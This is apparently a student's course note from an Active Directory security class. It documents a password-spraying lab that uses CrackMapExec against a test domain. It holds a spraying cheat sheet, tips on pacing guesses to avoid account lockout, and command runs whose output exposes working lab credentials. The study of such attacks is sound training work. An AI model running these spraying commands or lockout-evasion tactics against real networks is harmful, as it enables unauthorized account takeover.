---
title: NTUSTISC - AD Note - Lab(Password Spraying)
tags: [NTUSTISC, AD, information security]

category: "Security Course｜NTUST ISC｜AD｜3. 更多密碼"
date: 2024-01-31
---

# NTUSTISC - AD Note - Lab(Password Spraying)
<!-- more -->
[TOC]

Lecture Video: [2022/05/04 AD 安全1](https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&t=4257)

## Background
* 密碼收集
    * SAM.hive(Security Account Manager)
    * Password Spraying(用猜的)
        * 和brute force差在哪裡呢?其實概念一樣，只是角度不一樣，brute force是針對一隻帳號，用很多的密碼去猜；而password spraying則是用一組密碼去爆所有的帳號，其實就是反過來
        * Tool: [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) - 結合各種功能的內網滲透神器
    * GPO
    * 記憶體(lsass)

## Lab

### ==Password Spraying==
1. How to use?
    * Cheat Sheet
        ```bash
        $ crackmapexec <protocol> <target(s)> -u <a file or string only> -p <a file or string only>

        # For example
        $ crackmapexec smb 10.10.10.100 -u administrator -p Passw0rd
        $ crackmapexec smb 10.10.10.100 -u ~/file_usernames -p ~/file_passwords
        $ crackmapexec smb 10.10.10.100 -u administrator -p Passw0rd --local-auth
        $ crackmapexec smb <filename> -u administrator -p Passw0rd --local-auth
        ```
        `--local-auth`代表是用本機帳號的角度登入，就不是用domain admin的角度登入
2. Recon Password Policy
    在PowerShell中使用`$ Get-ADDefaultDomainPasswordPolicy`調查Domain上的密碼原則，Note: ==Win2016要打開==
    ```bash
    $ Get-ADDefaultDomainPasswordPolicy                                                        

    ComplexityEnabled           : False
    DistinguishedName           : DC=kuma,DC=org
    LockoutDuration             : 00:01:00
    LockoutObservationWindow    : 00:01:00
    LockoutThreshold            : 0
    MaxPasswordAge              : 00:00:00
    MinPasswordAge              : 00:00:00
    MinPasswordLength           : 4
    objectClass                 : {domainDNS}
    objectGuid                  : 29531761-1cf9-452c-8ee7-d5056e01d82b
    PasswordHistoryCount        : 24
    ReversibleEncryptionEnabled : False
    ```
    要注意的地方：
    * LockoutThreshold: 可以錯誤嘗試的次數，0就代表沒有設定，可以無限次數的爆破，如果有設定例如5，那可能就要修改攻擊策略，可能每天不能試超過兩次之類的，讓原使用者也還有容錯的空間可以登入
    * MinPasswordLength: 大多數使用者會遵從最小密碼原則，如果要猜密碼就可以嘗試從四位密碼以上開始猜
3. Check IP
    首先我們要先看一下AD的IP為多少，通常我們要做這種password spraying都是對著AD，所以我們要先尋找目標
    ```bash
    $ ipconfig

    Windows IP Configuration


    Ethernet adapter Ethernet0:

       Connection-specific DNS Suffix  . : localdomain
       Link-local IPv6 Address . . . . . : fe80::651f:6e78:505f:75f%5
       IPv4 Address. . . . . . . . . . . : 192.168.222.128
       Subnet Mask . . . . . . . . . . . : 255.255.255.0
       Default Gateway . . . . . . . . . : 192.168.222.2

    Tunnel adapter isatap.localdomain:

       Media State . . . . . . . . . . . : Media disconnected
       Connection-specific DNS Suffix  . : localdomain
    ```
    IP: `192.168.222.128`
4. 在Kali使用CrackMapExec
    ```bash
    $ crackmapexec smb 192.168.222.128/24 -u administrator -p 1qaz@WSX3edc             
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [*] Windows 10.0 Build 18362 x64 (name:DESKTOP-G95U93T) (domain:kuma.org) (signing:False) (SMBv1:False)
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:WIN-818G5VCOLJO) (domain:kuma.org) (signing:True) (SMBv1:True)
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [+] kuma.org\administrator:1qaz@WSX3edc (Pwn3d!)
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [+] kuma.org\administrator:1qaz@WSX3edc (Pwn3d!)
    ```
    可以看到這個網段底下的確有兩個主機的密碼被Pwn出來
5. Lab
    ==找出使用預設密碼(Changeme123!)的使用者
    找出使用(ncc1701)作為密碼的使用者==

    我先試著用前面提到的leak password from description中找到的兩組密碼實際測試看看
    帳密一、Lina Allene→`r2NE4/9:F;[k`
    帳密二、Fara Iseabal→`8F%kJ2q_cVFg`
    ```bash
    $ crackmapexec smb 192.168.222.128/24 -u ./AD-user.txt -p r2NE4/9:F\;\[k
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [*] Windows 10.0 Build 18362 x64 (name:DESKTOP-G95U93T) (domain:kuma.org) (signing:False) (SMBv1:False)
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:WIN-818G5VCOLJO) (domain:kuma.org) (signing:True) (SMBv1:True)
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\Administrator:r2NE4/9:F;[k STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\aleda.appolonia:r2NE4/9:F;[k STATUS_LOGON_FAILURE
    ...
    ```
    的確是lina.allene的密碼
    ```bash
    $ crackmapexec smb 192.168.222.128/24 -u ./AD-user.txt -p 8F%kJ2q_cVFg
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:WIN-818G5VCOLJO) (domain:kuma.org) (signing:True) (SMBv1:True)
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [*] Windows 10.0 Build 18362 x64 (name:DESKTOP-G95U93T) (domain:kuma.org) (signing:False) (SMBv1:False)
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\Administrator:8F%kJ2q_cVFg STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\aleda.appolonia:8F%kJ2q_cVFg STATUS_LOGON_FAILURE
    ...
    ```
    的確是fara.iseabal的密碼
    
    ---
    
    先利用win2016查詢`$ net user`然後把結果存成一個file，然後-u後面帶這個file
    ```bash
    $ crackmapexec smb 192.168.222.128/24 -u ./AD-user.txt -p Changeme123\!
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [*] Windows 10.0 Build 18362 x64 (name:DESKTOP-G95U93T) (domain:kuma.org) (signing:False) (SMBv1:False)
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:WIN-818G5VCOLJO) (domain:kuma.org) (signing:True) (SMBv1:True)
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\Administrator:Changeme123! STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\aleda.appolonia:Changeme123! STATUS_LOGON_FAILURE
    ...
    ```
    由於這個密碼的spraying結果沒有像前面兩個這麼明確，只有ella.randee的結果與別人不一樣，我不確定是不是command下錯之類的，但結果只有這樣
    ```bash
    crackmapexec smb 192.168.222.128/24 -u ./AD-user.txt -p ncc1701
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [*] Windows 10.0 Build 18362 x64 (name:DESKTOP-G95U93T) (domain:kuma.org) (signing:False) (SMBv1:False)
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:WIN-818G5VCOLJO) (domain:kuma.org) (signing:True) (SMBv1:True)
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [-] kuma.org\Administrator:ncc1701 STATUS_LOGON_FAILURE 
    SMB         192.168.222.129 445    DESKTOP-G95U93T  [+] kuma.org\aleda.appolonia:ncc1701 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [-] kuma.org\Administrator:ncc1701 STATUS_LOGON_FAILURE 
    SMB         192.168.222.128 445    WIN-818G5VCOLJO  [+] kuma.org\aleda.appolonia:ncc1701
    ```
    最後結果顯示是aleda.appolonia這個使用者的密碼為ncc1701